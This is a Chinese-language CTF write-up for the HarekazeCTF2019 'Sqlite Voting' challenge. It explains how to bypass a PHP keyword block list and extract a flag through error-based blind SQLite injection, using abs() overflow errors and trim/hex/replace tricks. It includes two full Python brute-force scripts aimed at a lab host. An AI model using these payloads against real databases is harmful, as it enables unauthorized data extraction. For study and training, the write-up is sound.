# \[HarekazeCTF2019]Sqlite Voting

## \[HarekazeCTF2019]Sqlite Voting

## 考点

* sqlite注入
* sqlite盲注
* sqlite中`abs`整数溢出导致盲注&#x20;

## wp

打开靶机，看到投票的页面，并且给了源码

![](../.gitbook/assets/Harekaze2019\_vote\_1.png)

在 `schema.sql` 中发现了 `flag` 表

```sql
  DROP TABLE IF EXISTS `vote`;
  CREATE TABLE `vote` (
    `id` INTEGER PRIMARY KEY AUTOINCREMENT,
    `name` TEXT NOT NULL,
    `count` INTEGER
  );
  INSERT INTO `vote` (`name`, `count`) VALUES
    ('dog', 0),
    ('cat', 0),
    ('zebra', 0),
    ('koala', 0);
  
  DROP TABLE IF EXISTS `flag`;
  CREATE TABLE `flag` (
    `flag` TEXT NOT NULL
  );
  INSERT INTO `flag` VALUES ('HarekazeCTF{<redacted>}');
```

在 `vote.php` 页面 `POST` 参数 `id` ，只能为数字。 `vote.php` 是查询的功能，但是对参数进行了过滤。

```php
  function is_valid($str) {
    $banword = [
      // dangerous chars
      // " % ' * + / < = > \ _ ` ~ -
      "[\"%'*+\\/<=>\\\\_`~-]",
      // whitespace chars
      '\s',
      // dangerous functions
      'blob', 'load_extension', 'char', 'unicode',
      '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',
      'in', 'limit', 'order', 'union', 'join'
    ];
    $regexp = '/' . implode('|', $banword) . '/i';
    if (preg_match($regexp, $str)) {
      return false;
    }
    return true;
  }
  
  $id = $_POST['id'];
  if (!is_valid($id)) {
    die(json_encode(['error' => 'Vote id contains dangerous chars']));
  }
  
  $pdo = new PDO('sqlite:../db/vote.db');
  $res = $pdo->query("UPDATE vote SET count = count + 1 WHERE id = ${id}");
  if ($res === false) {
    die(json_encode(['error' => 'An error occurred while updating database']));
  }
```

`UPDATE` 成功与失败分别对应了不同的页面，那么可以进行盲注，但是考虑到它过滤了 `'` 和 `"` 这就无法使用字符进行判断，`char` 又被过滤也无法使用 ASCII 码判断

<mark style="color:orange;">可以考虑使用</mark> <mark style="color:orange;"></mark><mark style="color:orange;">`hex`</mark> <mark style="color:orange;"></mark><mark style="color:orange;">进行字符判断，将所有的的字符串组合用有限的 36 个字符表示</mark>

先考虑对 flag 十六进制长度的判断，假设它的长度为 `x`，`y` 表示 2 的 n 次方，那么 `x&y` 就能表现出 `x` 二进制为 1 的位置，将这些 `y` 再进行<mark style="color:orange;">或运算</mark>就可以得到完整的 `x` 的二进制，也就得到了 flag 的长度，而 `1<<n` 恰可以表示 2 的 n 次方

那么如何构造报错语句呢？在 `sqlite3` 中，`abs` 函数有一个整数溢出的报错，如果 `abs` 的参数是 `-9223372036854775808` 就会报错，同样如果是正数也会报错

![](../.gitbook/assets/Harekaze2019\_vote\_3.png)

判断长度的 payload : `abs(case(length(hex((select(flag)from(flag))))&{1<<n})when(0)then(0)else(0x8000000000000000)end)`

脚本

```python
  import requests
  
  url = "http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php"
  l = 0
  for n in range(16):
  	payload = f'abs(case(length(hex((select(flag)from(flag))))&{1<<n})when(0)then(0)else(0x8000000000000000)end)'
  	data = {
  		'id' : payload
  	}
  	
  	r = requests.post(url=url, data=data)
  	print(r.text)
  	if 'occurred' in r.text:
  		l = l|1<<n
  
  print(l)
```

假设长度是20，20的二进制是`10100`

```
10100 & 10 = 0          不进行或运算
10100 & 100 = 100       进行或运算，l=0|100=100
10100 & 1000 = 0        不进行或运算
10100 & 10000 = 10000    l=100|10000=10100
```

![](../.gitbook/assets/Harekaze2019\_vote\_2.png)

然后考虑逐字符进行判断，但是 `is_valid()` 过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断

这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 `ABCDEF` ，这样十六进制的所有字符都可以使用了，并且使用 `trim(0,0)` 来表示空字符

```
  # hex(b'zebra') = 7A65627261
  # 除去 12567 就是 A ，其余同理
  A = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
  
  C = 'trim(hex(typeof(.1)),12567)'
  
  D = 'trim(hex(0xffffffffffffffff),123)'
  
  E = 'trim(hex(0.1),1230)'
  
  F = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
  
  # hex(b'koala') = 6B6F616C61
  # 除去 16CF 就是 B
  B = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{C}||{F})'
```

然后逐字符进行爆破，已经知道 flag 格式为 `flag{}` ，`hex(b'flag{')==666C61677B` ，在其后面逐位添加十六进制字符，构成 paylaod

再利用 `replace(length(replace(flag,payload,''))),84,'')` 这个语句进行判断

如果 flag 不包含 payload ，那么得到的 `length` 必为 84 ，最外面的 `replace` 将返回 `false` ，通过 `case when then else` 构造 `abs` 参数为 `0` ，它不报错

如果 flag 包含 payload ，那么 `replace(flag, payload, '')` 将 flag 中的 payload 替换为空，得到的 `length` 必不为 84 ，最外面的 `replace` 将返回 `true` ，通过 `case when then else` 构造 `abs` 参数为 `0x8000000000000000` 令其报错

以上就可以根据报错爆破出 flag，最后附上出题人脚本

```python
# coding: utf-8
import binascii
import requests
URL = 'http://1aa0d946-f0a0-4c60-a26a-b5ba799227b6.node2.buuoj.cn.wetolink.com:82/vote.php'


l = 0
i = 0
for j in range(16):
  r = requests.post(URL, data={
    'id': f'abs(case(length(hex((select(flag)from(flag))))&{1<<j})when(0)then(0)else(0x8000000000000000)end)'
  })
  if b'An error occurred' in r.content:
    l |= 1 << j
print('[+] length:', l)


table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
table['C'] = 'trim(hex(typeof(.1)),12567)'
table['D'] = 'trim(hex(0xffffffffffffffff),123)'
table['E'] = 'trim(hex(0.1),1230)'
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})'


res = binascii.hexlify(b'flag{').decode().upper()
for i in range(len(res), l):
  for x in '0123456789ABCDEF':
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
    r = requests.post(URL, data={
      'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
    })
    if b'An error occurred' in r.content:
      res += x
      break
  print(f'[+] flag ({i}/{l}): {res}')
  i += 1
print('[+] flag:', binascii.unhexlify(res).decode())
```

## 小结

1. sqlite3 盲注 bypass ，利用 replace() 和 length 进行爆破，trim() 替换空字符，trim() 和 hex() 构造字符，& 特性获取长度等等，在 mysql 中也存在整数溢出的现象
